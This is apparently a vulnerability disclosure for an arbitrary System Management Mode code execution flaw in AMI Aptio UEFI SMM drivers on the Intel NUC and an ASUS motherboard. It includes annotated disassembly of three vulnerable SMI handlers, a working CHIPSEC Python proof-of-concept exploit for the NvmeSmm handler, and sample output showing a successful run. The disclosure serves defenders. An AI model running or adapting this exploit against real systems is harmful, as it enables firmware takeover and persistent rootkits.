@@ -1,0 +1,343 @@
+
+  Intel NUC arbitrary System Management Mode code execution vulnerability
+===========================================================================
+
+
+  Vulnerable products
+-----------------------
+Intel NUC and other computers with AMI Aptio based firmware (confirmed for Intel NUC6i3SYH with SYSKLi35.86A firmware version and ASUS Q170M-C motherboard).
+
+  Vulnerability type
+----------------------
+Vulnerable SW SMI handles of various UEFI SMM drivers allows to overwrite arbitrary memory byte with constant value. This vulnerability type is exploitable and leads to arbitrary System Management Mode code execution.
+
+  Impact
+----------
+Intel NUC6i3SYH is not using SPI Protected Ranges (PRx) flash write protection and BootGuard, so, arbitrary SMM code execution vulnerability allows attacker to infect it's platform firmware with persistent UEFI rootkit.
+
+  Files
+---------
+Similar vulnerabilities exists in 3 different UEFI SMM drivers from AMI Aptio: NvmeSmm (GUID E5E2C9D9-5BF5-497E-8860-94F81A09ADE0), SdioSmm (GUID EA343100-1A37-4239-A3CB-B92240B935CF) and UsbRt (GUID 04EAAAA1-29A1-11D7-8838-00500473D4EB). You also can find these vulnerable drivers by hexadecimal signature "C1 E0 04 05 04 01 00 00" with the help of the UEFITool.
+
+  Discovered by
+-----------------
+Dmytro Oleksiuk - cr4sh0@gmail.com - http://cr4.sh
+
+  
+
+  Vulnerable SW SMI 0x42 handler from NvmeSmm driver (firmware version: SYSKLi35.86A)
+=======================================================================================
+
+                                       ;
+                                       ; NvmeSmm driver SW SMI handler 0x42 callback function
+                                       ;
+.text:0000000000000E40 sub_E40         proc near
+.text:0000000000000E40
+.text:0000000000000E40 arg_0           = qword ptr  8
+.text:0000000000000E40 arg_8           = qword ptr  10h
+.text:0000000000000E40
+.text:0000000000000E40                 mov     [rsp+arg_0], rbx
+.text:0000000000000E45                 mov     [rsp+arg_8], rsi
+.text:0000000000000E4A                 push    rdi
+.text:0000000000000E4B                 sub     rsp, 20h
+.text:0000000000000E4F                 mov     rbx, [r8]
+.text:0000000000000E52                 xor     edi, edi
+.text:0000000000000E54                 mov     cs:byte_2250, 1
+.text:0000000000000E5B                 cmp     rbx, rdi
+.text:0000000000000E5E                 jz      short loc_E65
+.text:0000000000000E60                 mov     [r8], rdi
+.text:0000000000000E63                 jmp     short loc_E77
+.text:0000000000000E65
+.text:0000000000000E65 loc_E65:
+                                       ;
+                                       ; Obtain some structure pointer from
+                                       ; Extended BIOS Data Area (EBDA) controlled
+                                       ; by attacker.
+                                       ;
+.text:0000000000000E65                 movzx   eax, word ptr ds:loc_40B+3
+.text:0000000000000E6D                 shl     eax, 4
+.text:0000000000000E70                 add     eax, 104h
+.text:0000000000000E75                 mov     ebx, [rax]
+.text:0000000000000E77
+.text:0000000000000E77 loc_E77:
+.text:0000000000000E77                 mov     edx, 62h
+.text:0000000000000E7C                 mov     rcx, rbx
+.text:0000000000000E7F                 call    sub_1E68
+.text:0000000000000E84                 cmp     rax, rdi
+.text:0000000000000E87                 mov     rsi, rax
+.text:0000000000000E8A                 jl      short loc_E9A
+.text:0000000000000E8C                 cmp     byte ptr [rbx], 27h
+.text:0000000000000E8F                 jnz     short loc_E97
+.text:0000000000000E91                 cmp     byte ptr [rbx+1], 0Ch
+.text:0000000000000E95                 jb      short loc_EA3
+.text:0000000000000E97
+.text:0000000000000E97 loc_E97:
+.text:0000000000000E97                 mov     rdi, rax
+.text:0000000000000E9A
+.text:0000000000000E9A loc_E9A:
+                                       ;
+                                       ; RBX register contains structure pointer controllable
+                                       ; by attacker, this fact allows to overwrite
+                                       ; one byte of memory at arbitrary address with
+                                       ; 0x07 constant value.
+                                       ;
+.text:0000000000000E9A                 mov     byte ptr [rbx+2], 7
+.text:0000000000000E9E                 mov     rax, rdi
+.text:0000000000000EA1                 jmp     short loc_EB7
+.text:0000000000000EA3
+.text:0000000000000EA3 loc_EA3:
+.text:0000000000000EA3                 movzx   eax, byte ptr [rbx+1]
+.text:0000000000000EA7                 lea     rdx, off_2C0
+.text:0000000000000EAE                 mov     rcx, rbx
+.text:0000000000000EB1                 call    qword ptr [rdx+rax*8]
+.text:0000000000000EB4                 mov     rax, rsi
+.text:0000000000000EB7
+.text:0000000000000EB7 loc_EB7:
+.text:0000000000000EB7                 mov     rbx, [rsp+28h+arg_0]
+.text:0000000000000EBC                 mov     rsi, [rsp+28h+arg_8]
+.text:0000000000000EC1                 add     rsp, 20h
+.text:0000000000000EC5                 pop     rdi
+.text:0000000000000EC6                 retn
+.text:0000000000000EC6 sub_E40         endp
+
+
+
+  Vulnerable SW SMI 0x40 handler from SdioSmm driver  
+======================================================
+
+                                       ;
+                                       ; SdioSmm driver SW SMI handler 0x40 callback function
+                                       ;
+.text:0000000000000C94 sub_C94         proc near
+.text:0000000000000C94                 push    rbx
+.text:0000000000000C96                 sub     rsp, 20h
+
+                                       ;
+                                       ; Obtain some structure pointer from
+                                       ; Extended BIOS Data Area (EBDA) controlled
+                                       ; by attacker.
+                                       ;
+.text:0000000000000C9A                 movzx   eax, ds:word_40E
+.text:0000000000000CA2                 mov     edx, 67h
+.text:0000000000000CA7                 mov     cs:byte_1FF0, 1
+.text:0000000000000CAE                 shl     eax, 4
+.text:0000000000000CB1                 add     eax, 104h
+.text:0000000000000CB6                 mov     ebx, [rax]
+.text:0000000000000CB8                 mov     rcx, rbx
+.text:0000000000000CBB                 call    sub_1B08
+.text:0000000000000CC0                 test    rax, rax
+.text:0000000000000CC3                 jns     short loc_CCB
+.text:0000000000000CC5
+.text:0000000000000CC5 loc_CC5:
+
+                                       ;
+                                       ; RBX register contains structure pointer controllable
+                                       ; by attacker, this fact allows to overwrite
+                                       ; one byte of memory at arbitrary address with
+                                       ; 0x07 constant value.
+                                       ;
+.text:0000000000000CC5                 mov     byte ptr [rbx+2], 7
+.text:0000000000000CC9                 jmp     short loc_CE0
+.text:0000000000000CCB
+.text:0000000000000CCB loc_CCB:
+.text:0000000000000CCB                 cmp     byte ptr [rbx], 4
+.text:0000000000000CCE                 jnb     short loc_CC5
+.text:0000000000000CD0                 movzx   eax, byte ptr [rbx]
+.text:0000000000000CD3                 lea     rdx, off_818
+.text:0000000000000CDA                 mov     rcx, rbx
+.text:0000000000000CDD                 call    qword ptr [rdx+rax*8]
+.text:0000000000000CE0
+.text:0000000000000CE0 loc_CE0:
+.text:0000000000000CE0                 xor     eax, eax
+.text:0000000000000CE2                 add     rsp, 20h
+.text:0000000000000CE6                 pop     rbx
+.text:0000000000000CE7                 retn
+.text:0000000000000CE7 sub_C94         endp
+
+
+
+  Vulnerable SW SMI 0x31 handler from UsbRt SMM driver
+========================================================
+
+                                       ;
+                                       ; UsbRt driver SW SMI handler 0x31 callback function.
+                                       ;
+.text:0000000000001B7C sub_1B7C        proc near
+.text:0000000000001B7C                 sub     rsp, 28h
+.text:0000000000001B80                 mov     rax, cs:gUsbData
+.text:0000000000001B87                 mov     rcx, [rax+6D78h]
+.text:0000000000001B8E                 test    rcx, rcx
+.text:0000000000001B91                 jz      short loc_1B9D
+.text:0000000000001B93                 and     qword ptr [rax+6D78h], 0
+.text:0000000000001B9B                 jmp     short loc_1BAF
+.text:0000000000001B9D
+.text:0000000000001B9D loc_1B9D:
+                                       ;
+                                       ; When handler was called during RT phase
+                                       ; it obtains some structure pointer from
+                                       ; Extended BIOS Data Area (EBDA) controlled
+                                       ; by attacker.
+                                       ;
+.text:0000000000001B9D                 movzx   eax, ds:word_40E
+.text:0000000000001BA5                 shl     eax, 4
+.text:0000000000001BA8                 add     eax, 104h
+.text:0000000000001BAD                 mov     ecx, [rax]
+.text:0000000000001BAF
+.text:0000000000001BAF loc_1BAF:
+.text:0000000000001BAF                 test    rcx, rcx
+.text:0000000000001BB2                 jnz     short loc_1BC0
+.text:0000000000001BB4                 mov     rax, 8000000000000009h
+.text:0000000000001BBE                 jmp     short loc_1BC7
+.text:0000000000001BC0
+.text:0000000000001BC0 loc_1BC0:
+                                       ;
+                                       ; Pass structure pointer to the child function.
+                                       ;
+.text:0000000000001BC0                 call    sub_1888
+.text:0000000000001BC5                 xor     eax, eax
+.text:0000000000001BC7
+.text:0000000000001BC7 loc_1BC7:
+.text:0000000000001BC7                 add     rsp, 28h
+.text:0000000000001BCB                 retn
+.text:0000000000001BCB sub_1B7C        endp
+
+                                       ;
+                                       ; Child function that doing the rest of the SW SMI
+                                       ; dispatch stuff.
+                                       ;
+.text:0000000000001888 sub_1888        proc near
+.text:0000000000001888                 sub     rsp, 28h
+.text:000000000000188C                 test    rcx, rcx
+.text:000000000000188F                 jz      short loc_18AE
+.text:0000000000001891                 mov     al, [rcx]
+.text:0000000000001893                 test    al, al
+.text:0000000000001895                 jz      short loc_18A1
+.text:0000000000001897                 cmp     al, 20h
+.text:0000000000001899                 jb      short loc_18B3
+.text:000000000000189B                 cmp     al, 38h
+.text:000000000000189D                 ja      short loc_18B3
+.text:000000000000189F                 add     al, 0E1h
+.text:00000000000018A1
+.text:00000000000018A1 loc_18A1:
+.text:00000000000018A1                 lea     rdx, off_DF0
+.text:00000000000018A8                 movzx   eax, al
+
+                                       ;
+                                       ; Call USB specific handler by it’s number.
+                                       ; Handler number is not controllable by attacker
+                                       ; because sub_1888() checks it for array index
+                                       ; out of bounds.
+                                       ;
+.text:00000000000018AB                 call    qword ptr [rdx+rax*8]
+.text:00000000000018AE
+.text:00000000000018AE loc_18AE:
+.text:00000000000018AE                 add     rsp, 28h
+.text:00000000000018B2                 retn
+.text:00000000000018B3
+.text:00000000000018B3 loc_18B3:
+                                       ;
+                                       ; RCX register contains structure pointer controllable
+                                       ; by attacker, this fact allows to overwrite
+                                       ; one byte of memory at arbitrary address with
+                                       ; 0xF0 constant value.
+                                       ;
+.text:00000000000018B3                 mov     byte ptr [rcx+2], 0F0h
+.text:00000000000018B7                 jmp     short loc_18AE
+.text:00000000000018B7 sub_1888        endp
+
+
+
+  Proof of Concept exploit on example of NvmeSmm vulnerable driver
+====================================================================
+
+#
+# This exploit overwrites one byte of memory with 0x07 at 0x1002 address using
+# SW SMI handler vulnerability. To run this code you need to install CHIPSEC.
+#
+import sys, os, struct
+from hexdump import hexdump
+
+EBDA_ADDR = 0x040E
+SMI_NUM = 0x42
+
+class Chipsec(object):
+
+    def __init__(self):
+
+        import chipsec.chipset
+        import chipsec.hal.physmem
+        import chipsec.hal.interrupts
+
+        # initialize CHIPSEC
+        self.cs = chipsec.chipset.cs()
+        self.cs.init(None, True)
+
+        # get instances of required classes
+        self.mem = chipsec.hal.physmem.Memory(self.cs)
+        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)
+
+    # CHIPSEC has no physical memory read/write methods for quad words
+    def read_physical_mem_qword(self, addr):
+
+        return struct.unpack('Q', self.mem.read_physical_mem(addr, 8))[0]
+
+    def write_physical_mem_qword(self, addr, val):
+
+        self.mem.write_physical_mem(addr, 8, struct.pack('Q', val))
+
+def main():
+
+    #initialize chipsec stuff
+    cs = Chipsec()
+
+    # backup memory contents
+    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)
+
+    addr_1 = (val_0 << 4) + 0x0104
+    addr_2 = 0x1000
+
+    print 'Old value at 0x%.8x is 0x%.4x (physical address is 0x%.8x)' % \
+          (EBDA_ADDR, val_0, addr_1)
+
+    val_1 = cs.mem.read_physical_mem_dword(addr_1)
+    val_2 = cs.mem.read_physical_mem_dword(addr_2)
+
+    print 'Old value at 0x%.8x is 0x%.8x, overwriting with 0x%.8x' % \
+          (addr_1, val_1, addr_2)
+
+    # write destinatin address value to memory
+    cs.mem.write_physical_mem_dword(addr_1, addr_2)
+    cs.mem.write_physical_mem_dword(addr_2, 0)
+
+    # fire SMI and overwrite byte at addr_2 + 2 with 0x07
+    cs.ints.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, 0, 0)
+
+    # restore overwritten memory
+    cs.mem.write_physical_mem_dword(addr_1, val_1)
+
+    val = cs.mem.read_physical_mem_byte(addr_2 + 2)
+
+    # restore overwritten memory
+    cs.mem.write_physical_mem_dword(addr_2, val_2)
+
+    # check for successful exploitation
+    print 'SUCCESS' if val == 0x07 else \
+          'FAILS'
+
+    return 0
+
+if __name__ == '__main__':
+
+    exit(main())
+
+
+  Example of exploit output on vulnerable system
+==================================================
+
+# python smi_expl_42_nuc.py
+****** Chipsec Linux Kernel module is licensed under GPL 2.0
+Old value at 0x0000040e is 0x9c80 (physical address is 0x0009c904)
+Old value at 0x0009c904 is 0x00000000, overwriting with 0x00001000
+SUCCESS
+
+
